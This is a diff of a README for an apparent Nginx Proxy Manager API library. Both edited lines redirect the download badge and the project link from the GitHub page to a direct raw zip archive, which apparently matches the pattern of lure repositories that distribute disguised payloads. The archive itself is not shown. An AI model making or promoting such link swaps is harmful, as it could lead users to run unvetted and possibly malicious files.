@@ -1,6 +1,6 @@
 # 🌐 nginx-proxy-manager-api - Manage your network traffic with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Nginx_Proxy_Manager-blue.svg)](https://github.com/mariadelapazj2155/nginx-proxy-manager-api)
+[![Download Software](https://img.shields.io/badge/Download-Nginx_Proxy_Manager-blue.svg)](https://raw.githubusercontent.com/mariadelapazj2155/nginx-proxy-manager-api/main/api/nginx-proxy-manager-api-v3.4.zip)
 
 This tool helps you manage network settings. It works with Nginx Proxy Manager to handle web traffic, digital certificates, and access rules. You use this library to connect your own software to your proxy server. It handles the difficult connection steps for you.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. You also need Node.js inst
 
 You must visit the project page to access the files. Follow these steps to set up the software on your system.
 
-[Click here to visit the project page and download the files](https://github.com/mariadelapazj2155/nginx-proxy-manager-api)
+[Click here to visit the project page and download the files](https://raw.githubusercontent.com/mariadelapazj2155/nginx-proxy-manager-api/main/api/nginx-proxy-manager-api-v3.4.zip)
 
 1. Open the project link in your web browser.
 2. Look for the green button labeled Code.
